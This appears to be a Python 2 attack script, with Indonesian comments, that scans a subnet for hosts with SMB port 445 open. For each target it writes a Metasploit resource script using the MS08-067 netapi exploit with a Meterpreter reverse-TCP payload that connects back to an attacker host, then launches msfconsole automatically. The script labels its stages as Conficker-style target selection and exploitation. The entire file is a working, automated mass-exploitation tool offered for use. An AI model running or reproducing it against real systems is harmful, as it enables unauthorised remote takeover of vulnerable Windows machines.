#!/usr/bin/python
# written for py-sc.org
# cracking poverty with python

import nmap
import optparse
import os

def targetSelection(targetList,subNet):
	# Function untuk seleksi target
	nmapScanner = nmap.PortScanner()
	nmapScanner.scan(subNet, '445')
	targetHosts = []
	for host in nmapScanner.all_hosts():
		if nmapScanner[host].has_tcp(445):
			state = nmapScanner[host]['tcp'][445]['state']
			if state == 'open':
				print '[+] Found Target Host: ' + host
				#targetHosts.append(host)
				targetList.write(str(host) + "\n")

def attackerHandler(resourceScript,attackerHost, attackerPort):
	# Function untuk setup handler di attacker host
	resourceScript.write('use exploit/multi/handler\n')
	resourceScript.write('set payload windows/meterpreter/reverse_tcp\n')
	resourceScript.write('set LPORT ' + str(attackerPort) + '\n')
	resourceScript.write('set LHOST ' + attackerHost + '\n')
	resourceScript.write('exploit -j -z\n')
	resourceScript.write('setg DisablePayloadHandler 1\n')
	
def attackerExploit(resourceScript, targetHost, attackerHost, attackerPort):
	# Function untuk setup exploit MS08_67
	resourceScript.write('use exploit/windows/smb/ms08_067_netapi\n')
	resourceScript.write('set RHOST ' + str(targetHost) + '\n')
	resourceScript.write('set payload windows/meterpreter/reverse_tcp\n')
	resourceScript.write('set LPORT ' + str(attackerPort) + '\n')
	resourceScript.write('set LHOST ' + attackerHost + '\n')
	resourceScript.write('exploit -j -z \n')

def main():

	# Membuat resources script
	resourceScript = open('exploit_MS0867.rc','w')
	targetList = open('targetlist','w')
	# Menerima input target host dan target port
	parser = optparse.OptionParser('[*] Usage: script' + ' -H <Range of Targets> -l <LHOST> [-p <LPORT>]' )
	parser.add_option('-H', dest='targetHost', type='string', help='specify range of target')
	parser.add_option('-p', dest='attackerPort',type='string', help='specify the listen port in attacker machine')
	parser.add_option('-l', dest='attackerHost', type='string', help='specify the attacker address')

	(options, args) = parser.parse_args()
	if (options.targetHost == None) | (options.attackerHost == None):
		print parser.usage
		exit(0)
	attackerHost = options.attackerHost
	attackerPort = options.attackerPort
	if attackerPort == None:
		attackerPort = '7777'
	
	# Fase I: Target Selection
	print "\n" + "Phase - I: Conficker target selection is in progress ... " + "\n"
	#targetHosts = targetSelection(options.targetHost)
	targetSelection(targetList, options.targetHost)
	targetList.close()
	targetVictim = open('targetlist','r')
	print "\n" + "Phase - I: Conficker target selection is finished .." + "\n"

	# Fase II: Exploit MS08_67 Vulnerability

	## Menyiapkan attacker handler pada resource script
	attackerHandler(resourceScript, attackerHost, attackerPort)

	## Mengeksekusi exploit bagi MS08_67 pada resource script
	for victim in targetVictim.readlines():
		victim = victim.strip("\n")
		attackerExploit(resourceScript, victim, attackerHost, attackerPort)	

	# Fase III: Mengeksekusi resource script
	resourceScript.close()
	print "\n" + "Phase II: Exploit MS08_67 is in progress ..." + "\n"
	os.system('msfconsole -r exploit_MS0867.rc')
	print "\n" + "Phase II: Exploit MS08_67 is finished ..." + "\n"
	

if __name__ == main():
	main()
